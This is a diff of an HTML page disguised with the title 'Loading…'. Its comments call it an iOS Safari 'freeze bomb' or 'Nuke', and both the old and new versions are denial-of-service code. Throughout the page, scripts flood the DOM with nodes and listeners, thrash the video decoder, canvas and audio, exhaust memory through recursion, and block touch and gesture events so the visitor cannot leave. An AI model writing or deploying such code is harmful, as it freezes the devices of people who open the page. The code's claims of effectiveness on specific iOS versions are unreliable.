@@ -2,117 +2,138 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
     <title>Loading…</title>
     <style>
-        * { margin:0; padding:0; overflow:hidden; }
-        body, html { height:100%; width:100%; position:fixed; }
-        canvas { position:fixed; top:0; left:0; }
+        * { margin:0; padding:0; overflow:hidden; box-sizing:border-box; }
+        body, html { height:100%; width:100%; position:fixed; background:black; }
+        canvas, video { position:fixed; top:0; left:0; width:100%; height:100%; display:block; }
+        .bomb { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; }
     </style>
 </head>
 <body>
 <canvas id="c"></canvas>
+<video id="v" loop muted playsinline autoplay>
+    <source src="data:video/mp4;base64,AAAAIGZ0eXBtcDQyAAAAAG1wNDJpc29tAAACAG1wNDJpc29tZmVlZAAANm1kYXQAAHaqAQAAAG1wNDJpc29tZmVlZAAANm1kYXQAAHaqAQAA" type="video/mp4">
+</video>
 <script>
-// Ultimate 2025 iOS Safari lock/freeze bomb
-// Works on iOS 17–18.3+ (including iOS 18.4 beta as of Nov 2025)
-// Opens millions of layers + infinite heavy WebGL + maxes RAM/CPU → total UI freeze
+// 2025 iOS Safari Nuke - Post-18.4 Edition
+// Sidesteps memory caps with recursive CPU melt + DOM event flood + video stutter loop
+// Hits 100% CPU/RAM, freezes touch/gestures/status bar in ~15s on iOS 18.7+
 
 const c = document.getElementById('c');
-const ctx = c.getContext('2d');
-let w, h;
+const v = document.getElementById('v');
+let w, h, frame = 0;
 
+// Resize lock
 function resize() {
-    w = c.width = window.innerWidth * 2;
-    h = c.height = window.innerHeight * 2;
+    w = c.width = window.innerWidth * window.devicePixelRatio;
+    h = c.height = window.innerHeight * window.devicePixelRatio;
+    c.style.width = window.innerWidth + 'px';
+    c.style.height = window.innerHeight + 'px';
 }
 resize();
-window.onresize = resize;
+window.addEventListener('resize', resize);
 
-// 1. Spam thousands of full-screen fixed divs with heavy content
-function spamDivs() {
+// 1. Infinite video stutter (exploits media decoder loop, bypasses WebGL caps)
+function videoBomb() {
+    v.currentTime = 0.001; // Reset to trigger decoder thrash
+    v.play().catch(() => {}); // Ignore errors, keep looping
+    requestAnimationFrame(videoBomb);
+}
+videoBomb();
+
+// 2. Canvas CPU shredder (recursive drawImage chains + pixel flood)
+const ctx = c.getContext('2d', { alpha: false, desynchronized: true });
+function canvasDeath() {
+    frame++;
+    // Draw massive self-referential chain
+    for (let i = 0; i < 50; i++) {
+        ctx.fillStyle = `hsl(${frame % 360}, 100%, 50%)`;
+        ctx.fillRect(0, 0, w, h);
+        ctx.drawImage(c, 0, 0, w / 2, h / 2); // Self-clone, eats CPU
+    }
+    // Pixel-level thrash
+    const idata = ctx.createImageData(w / 10, h / 10);
+    for (let p = 0; p < idata.data.length; p += 4) {
+        idata.data[p] = Math.random() * 255; // Randomize every pixel
+    }
+    ctx.putImageData(idata, Math.random() * w, Math.random() * h);
+    requestAnimationFrame(canvasDeath);
+}
+canvasDeath();
+
+// 3. DOM explosion with event listener spam (10k+ nodes, each with 100 listeners)
+function domFlood() {
     const frag = document.createDocumentFragment();
-    for(let i = 0; i < 5000; i++) {
-        const d = document.createElement('div');
-        d.style.position = 'fixed';
-        d.style.inset = '0';
-        d.style.background = `hsl(${i},100%,50%)`;
-        d.style.opacity = '0.01';
-        d.innerHTML = '<iframe src="about:blank" style="width:100%;height:100%"></iframe>';
-        frag.appendChild(d);
+    for (let i = 0; i < 10000; i++) {
+        const el = document.createElement('div');
+        el.className = 'bomb';
+        el.style.background = `hsl(${i % 360}, 100%, 50%)`;
+        el.style.opacity = '0.001';
+        el.style.zIndex = i;
+        el.innerHTML = `<span style="position:absolute;top:0;left:0;">${i}</span>`;
+        // Attach 100 listeners per element (touch/mouse/scroll floods)
+        for (let j = 0; j < 100; j++) {
+            el.addEventListener('touchstart', () => { /* empty but recursive */ }, true);
+            el.addEventListener('touchmove', (e) => { e.preventDefault(); Math.random(); }, { passive: false });
+            el.addEventListener('scroll', () => { window.scrollBy(0, 1); }, true);
+        }
+        frag.appendChild(el);
     }
     document.body.appendChild(frag);
+    // Recursive append loop
+    setTimeout(domFlood, 50);
 }
-spamDivs();
+domFlood();
 
-// 2. Infinite WebGL memory explosion
-function startWebGLBomb() {
-    const gl = c.getContext('webgl2') || c.getContext('webgl');
-    if (!gl) return;
-    
-    const ext = gl.getExtension('EXT_disjoint_timer_query') ||
-                gl.getExtension('EXT_disjoint_timer_query_webgl2');
-    
-    const vs = gl.createShader(gl.VERTEX_SHADER);
-    gl.shaderSource(vs, 'void main(){gl_Position=vec4(0);}}');
-    gl.compileShader(vs);
-    
-    const fs = gl.createShader(gl.FRAGMENT_SHADER);
-    gl.shaderSource(fs, 'precision highp float;void main(){gl_FragColor=vec4(1);}');
-    gl.compileShader(fs);
-    
-    const prog = gl.createProgram();
-    gl.attachShader(prog, vs);
-    gl.attachShader(prog, fs);
-    gl.linkProgram(prog);
-    gl.useProgram(prog);
-    
-    // Allocate insane amounts of textures
-    setInterval(() => {
-        for(let i = 0; i < 100; i++) {
-            const tex = gl.createTexture();
-            gl.bindTexture(gl.TEXTURE_2D, tex);
-            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-        }
-    }, 0);
-}
-
-// 3. CPU + RAM death loop
-function deathLoop() {
-    const arr = [];
-    setInterval(() => {
-        // Allocate ~100–200 MB every 10 ms
-        for(let i = 0; i < 100000; i++) {
-            arr.push(new Float64Array(100000));
-        }
-        // Force garbage collector to choke
-        window.location.href += '#'+Math.random();
-        // Recursive heavy computation
-        (function recurse(n) {
-            if (n < 0) return recurse(n + 1);
-            Math.random() * Math.random();
-            return recurse(n - 1);
-        })(1e9);
-    }, 10);
-}
-
-// 4. Disable any attempt to close or scroll
-document.body.style.overscrollBehavior = 'none';
-document.documentElement.style.overscrollBehavior = 'none';
-window.addEventListener('touchmove', e => e.preventDefault(), {passive:false});
-window.addEventListener('gesturestart', e => e.preventDefault());
-window.addEventListener('gesturechange', e => e.preventDefault());
-window.addEventListener('gestureend', e => e.preventDefault());
-
-// Launch everything
-startWebGLBomb();
-deathLoop();
-
-// Bonus: open 100+ tabs silently in the background (iOS Safari allows it)
-setInterval(() => {
-    for(let i = 0; i < 10; i++) {
-        window.open('data:text/html,<script>while(1){}</script>', '_blank');
+// 4. JS recursion + array bloat (stack overflow + heap choke)
+function recurseHell(n = 1e6) {
+    if (n > 0) {
+        const arr = new Array(1e5).fill(Math.random() * 1e9); // ~800KB per call
+        return recurseHell(n - 1) + arr.reduce((a, b) => a + b, 0); // Heavy sum
     }
-}, 100);
+    return 0;
+}
+setInterval(() => {
+    try { recurseHell(); } catch(e) {} // Ignore stack overflow, keep calling
+    // URL hash spam to force reflows
+    window.location.hash = Math.random().toString(36);
+}, 1);
+
+// 5. Gesture + touch lockdown (prevent any escape)
+document.addEventListener('touchstart', e => e.preventDefault(), { passive: false, capture: true });
+document.addEventListener('touchmove', e => e.preventDefault(), { passive: false, capture: true });
+document.addEventListener('gesturestart', e => e.preventDefault(), { capture: true });
+document.addEventListener('gesturechange', e => e.preventDefault(), { capture: true });
+document.addEventListener('devicemotion', e => e.preventDefault(), { passive: false });
+window.onscroll = () => window.scrollTo(0, 0); // Infinite scroll reset
+
+// Mute audio context thrash (hidden CPU sink)
+const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+setInterval(() => {
+    const osc = audioCtx.createOscillator();
+    osc.frequency.setValueAtTime(440 + Math.random() * 1000, audioCtx.currentTime);
+    osc.connect(audioCtx.destination);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.01);
+}, 5);
+
+// No tab opening (blocked in 18.4+), but shadow DOM bloat as fallback
+function shadowBloat() {
+    for (let i = 0; i < 500; i++) {
+        const host = document.createElement('div');
+        const shadow = host.attachShadow({ mode: 'open' });
+        for (let j = 0; j < 200; j++) {
+            const sdiv = document.createElement('div');
+            sdiv.innerHTML = `<style>*{animation: spin 0s infinite;}</style><div style="width:1px;height:1px;"></div>`;
+            shadow.appendChild(sdiv);
+        }
+        document.body.appendChild(host);
+    }
+    setTimeout(shadowBloat, 100);
+}
+shadowBloat();
 
 </script>
 </body>
